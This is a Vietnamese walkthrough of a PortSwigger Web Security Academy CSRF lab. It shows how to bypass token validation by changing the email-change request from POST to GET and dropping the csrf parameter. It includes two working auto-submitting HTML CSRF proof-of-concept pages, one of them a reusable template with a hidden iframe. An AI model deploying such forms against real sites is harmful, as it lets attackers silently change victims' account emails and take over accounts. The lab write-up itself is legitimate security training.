# CSRF where token validation depends on request method

### Yêu cầu: Tạo thẻ HTML để tấn công CSRF thay đổi email của tài khoản người dùng

### Hướng làm: 

Đầu tiên chúng ta sẽ đăng nhập vào tài khoản `wiener:peter` rồi bắt request khi thay đổi email của tài khoản đó bằng 1 tên mail bất kì.

![image](https://user-images.githubusercontent.com/72268643/157420159-49cbcf32-6f40-43c9-9db1-59bfa0cc807a.png)

Sau khi gửi đến `Repeater` ta thấy được rằng chúng ta sử dụng method POST cùng với có CSRF token.

![image](https://user-images.githubusercontent.com/72268643/157420436-5401ef76-9aa1-40b0-beec-967bd75f3f7e.png)

Để làm được bài này, ta sẽ thay đổi phương thức request (method) từ POST sang GET (vì GET thường được dùng trong các phương thức tìm kiếm nên thường không dùng token để xác thực nên có thể dùng để gửi dữ liệu lên ứng dụng web mà không cần CSRF token) sau đó gửi trả request đó để xem phản hồi. 

![image](https://user-images.githubusercontent.com/72268643/157420976-10f3f131-ea35-4460-a200-a843a52699e2.png)

Trang web vẫn phản hồi dù cho chúng ta vẫn thêm param `csrf` trên URL. Bây giờ ta sẽ xóa param `csrf` đi và gửi lại request.

![image](https://user-images.githubusercontent.com/72268643/157423147-d2fe23d0-1bd7-4289-baeb-05069f345d97.png)

Trang web trả kết quả tìm thấy, và nếu Follow Response đó ta sẽ được kết quả là email đã được đổi tên.

![image](https://user-images.githubusercontent.com/72268643/157423546-faa5afee-6784-4b50-aa07-b60b0d649ee9.png)

Vậy kết luận lại để làm được lab này, ta cần đổi request method sau đó Generate CSRF PoC.

![image](https://user-images.githubusercontent.com/72268643/157424034-76a72fa0-d952-41fb-8546-020158b4fe48.png)

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac1f1f181e57a2f1c0d008f6004800b2.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="victim&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit(); <!-- Phần tự submit -->
    </script>
  </body>
</html>
```

Hoặc tự viết PoC theo form sau (Nhớ đổi sang method GET nhé):

```
<html>
  <body>
    <h1>Hello World</h1> <!-- Phần được hiển thị-->
    <iframe style="display:none;" name="csrf-iframe"></iframe> <!-- Để ẩn thẻ form khi hiển thị tới nạn nhân -->
    <form action="nơi_khai_thác_CSRF_ở_trên_trang_web_đó" method="GET" id="csrf-form">
      <input type="hidden" name="email" value="email_mà_bạn_muốn_đổi">
    </form>

    <script>document.getElementById("csrf-form").submit()</script> <!-- Phần tự submit form thực thi -->
  </body>
</html>
```
 
Copy đoạn HTML đó để gửi lên phía server để thực thi.

![image](https://user-images.githubusercontent.com/72268643/157425056-859ae19b-251e-4cc7-9efe-0f69fa2571fd.png)

Store vào hoàn thành lab.
